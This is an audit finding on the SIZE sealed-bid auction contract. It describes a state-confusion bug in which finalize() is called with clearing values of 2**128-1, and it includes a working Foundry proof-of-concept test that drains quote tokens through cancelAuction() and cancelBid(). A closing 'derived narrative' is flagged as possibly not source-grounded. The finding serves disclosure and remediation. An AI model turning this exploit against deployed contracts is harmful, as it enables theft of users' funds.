---
id: 17116
severity: "High"
---

# Attacker can steal any funds in the contract by state confusion

## Description

HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions).  
LOC:  

Auctions in SIZE can be in one of several states, as checked in the atState() modifier:
```solidity
modifier atState(Auction storage a, States _state) {
    if (block.timestamp < a.timings.startTimestamp) {
        if (_state != States.Created) revert InvalidState();
    } else if (block.timestamp < a.timings.endTimestamp) {
        if (_state != States.AcceptingBids) revert InvalidState();
    } else if (a.data.lowestQuote != type(uint128).max) {
        if (_state != States.Finalized) revert InvalidState();
    } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {
        if (_state != States.RevealPeriod) revert InvalidState();
    } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {
        if (_state != States.Voided) revert InvalidState();
    } else {
        revert();
    }
    _;
}
```
It’s important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if finalize() was called.

The value is set to max at createAuction. In finalize, it is set again, using user-controlled input:
```solidity
// Last filled bid is the clearing price
a.data.lowestBase = clearingBase;
a.data.lowestQuote = clearingQuote;
```
The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:
```solidity
// Transfer the left over baseToken
if (data.totalBaseAmount != data.filledBase) {
    uint128 unsoldBase = data.totalBaseAmount - data.filledBase;
    a.params.totalBaseAmount = data.filledBase;
    SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);
}
// Calculate quote amount based on clearing price
uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);
SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);
```
Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:
```solidity
function cancelAuction(uint256 auctionId) external {
    Auction storage a = idToAuction[auctionId];
    if (msg.sender != a.data.seller) {
        revert UnauthorizedCaller();
    }
    // Only allow cancellations before finalization
    // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)
    if (a.data.lowestQuote != type(uint128).max) {
        revert InvalidState();
    }
    // Allowing bidders to cancel bids (withdraw quote)
    // Auction considered forever States.AcceptingBids but nobody can finalize
    a.data.seller = address(0);
    a.timings.endTimestamp = type(uint32).max;
    emit AuctionCancelled(auctionId);
    SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);
}

function cancelBid(uint256 auctionId, uint256 bidIndex)
    external
{
    Auction storage a = idToAuction[auctionId];
    EncryptedBid storage b = a.bids[bidIndex];
    if (msg.sender != b.sender) {
        revert UnauthorizedCaller();
    }
    // Only allow bid cancellations while not finalized or in the reveal period
    if (block.timestamp >= a.timings.endTimestamp) {
        if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {
            revert InvalidState();
        }
    }
    // Prevent any futher access to this EncryptedBid
    b.sender = address(0);
    // Prevent seller from finalizing a cancelled bid
    b.commitment = 0;
    emit BidCancelled(auctionId, bidIndex);
    SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);
}
```
The attack will look as follows:

  1. attacker uses two contracts - buyer and seller
  2. seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens.
  3. buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X.
  4. after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2**128-1**.
  5. seller contract receives X-Y unsold base tokens and Y quote tokens
  6. seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max`
  7. buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens.
  8. The accounting shows attacker profited Y quote tokens, which are both in buyer and seller’s contract.

Note that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.

This was the main constraint to bypass:
```solidity
uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);
...
data.previousQuotePerBase = quotePerBase;
...
if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {
            revert InvalidCalldata();
        }
```
Since clearingQuote must equal UINT128_MAX, we must satisfy: (2**128-1) * (2**128-1) / clearingBase = quoteAmount * (2**128-1) / baseAmount. The solution I found was setting clearingBase to (2**128-1) and quoteAmount = baseAmount.

We also have constraints on reserveQuotePerBase. In createAuction:
```solidity
if (
    FixedPointMathLib.mulDivDown(
        auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount
    ) > auctionParams.reserveQuotePerBase
) {
    revert InvalidReserve();
}
```
While in finalize():
```solidity
// Only fill if above reserve price
if (quotePerBase < data.reserveQuotePerBase) continue;
```
And an important constraint on quoteAmount and minimumBidQuote:
```solidity
if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {
    revert InvalidBidAmount();
}
```
Merging them gives us two equations to substitute variables in:

  1. `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase`
  2. `quoteAmount > minimumBidQuote`

In the POC I’ve crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.

## Proof of Concept

Copy the following code in SizeSealed.t.sol
```solidity
function testAttack() public {
    quoteToken = new MockERC20("USD Coin", "USDC", 6);
    baseToken = new MockERC20("DAI stablecoin ", "DAI", 18);
    // Bootstrap auction contract with some funds
    baseToken.mint(address(auction), 1e20);
    quoteToken.mint(address(auction), 1e12);
    // Create attacker
    MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);
    MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);
    // Print attacker balances
    uint256 balance_quote;
    uint256 balance_base;
    (balance_quote, balance_base) = attacker_seller.balances();
    console.log("Starting seller balance: ", balance_quote, balance_base);
    (balance_quote, balance_base) = attacker_buyer.balances();
    console.log('Starting buyer balance: ', balance_quote, balance_base);
    // Create auction
    uint256 auction_id = attacker_seller.createAuction(
        2**32,  // totalBaseAmount
        2**120, // reserveQuotePerBase
        2**20, // minimumBidQuote
        uint32(block.timestamp), // startTimestamp
        uint32(block.timestamp + 1),  // endTimestamp
        uint32(block.timestamp + 1), // vestingStartTimestamp
        uint32(block.timestamp + 1), // vestingEndTimestamp
        0 // cliffPercent
    );
    // Bid on auction
    attacker_buyer.setAuctionId(auction_id);
    attacker_buyer.bidOnAuction(
        2**30, // baseAmount
        2**30  // quoteAmount
    );
    // Finalize with clearingQuote = clearingBase = 2**128-1
    // Will transfer unsold base amount + matched quote amount
    uint256[] memory bidIndices = new uint[](1);
    bidIndices[0] = 0;
    vm.warp(block.timestamp + 10);
    attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);
    // Cancel auction
    // Will transfer back sold base amount
    attacker_seller.cancelAuction();
    // Cancel bid
    // Will transfer back to buyer quoteAmount
    attacker_buyer.cancel();
    // Net profit of quoteAmount tokens of quoteToken
    (balance_quote, balance_base) = attacker_seller.balances();
    console.log("End seller balance: ", balance_quote, balance_base);
    (balance_quote, balance_base) = attacker_buyer.balances();
    console.log('End buyer balance: ', balance_quote, balance_base);
}
```

## Recommendation

Do not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a state‑confusion bug that arises from using the variable lowestQuote as a sentinel to indicate whether an auction has been finalized. In the contract the atState modifier determines the current auction phase by checking the block timestamp and, after the end time, by inspecting whether lowestQuote still equals the maximum uint128 value. The code assumes that once finalize() is called the sentinel will be replaced by a real price, but finalize() accepts user‑controlled inputs for clearingBase and clearingQuote and does not forbid setting them to the maximum uint128 value. An attacker can therefore call finalize() with clearingQuote and clearingBase both equal to 2**128‑1, which satisfies the internal checks and triggers the transfer of unsold base tokens to the seller and the matched quote tokens to the seller as well. Because lowestQuote remains at the sentinel value, the contract still believes the auction is not finalized. Consequently the seller (or any attacker controlling the seller address) can invoke cancelAuction(), which resets the end timestamp to the maximum uint32 value and refunds the total base amount, and the buyer can subsequently call cancelBid() and receive a refund of the quote amount. The net effect is that the attacker receives both the quote tokens that were transferred during finalize and the quote tokens refunded by cancelBid, effectively creating tokens out of thin air. This can be performed without any preconditions; the attacker only needs to craft an auction with specific parameters that satisfy the inequality checks in createAuction, bid and finalize, such as setting the clearing price to the maximum uint128 value and matching base and quote amounts. From a user’s perspective the UI may show an auction that appears to have been finalized, yet the seller can still cancel it and both parties receive funds they should not have. The impact is a loss of funds from the protocol’s treasury and a breach of the accounting guarantees that each token is transferred exactly once. The bug was discovered during a manual audit that examined the state machine logic and identified that the sentinel value could be overwritten, a subtle condition that is easy to miss because the maximum uint128 value is a legitimate numeric constant and the code does not explicitly track a finalized flag. The issue is hard to notice because the contract’s state transitions are implicit and rely on a mutable variable rather than an explicit enum, allowing the state to be misinterpreted after an attacker manipulates the sentinel. The recommended fix is to stop using lowestQuote as a proxy for the auction state and instead introduce a dedicated state variable (e.g., an enum) that is set atomically when finalize() succeeds, and to reject any finalize call that attempts to set the price to the sentinel value. This eliminates the ambiguity and prevents the state‑confusion that enables the double‑withdrawal attack.
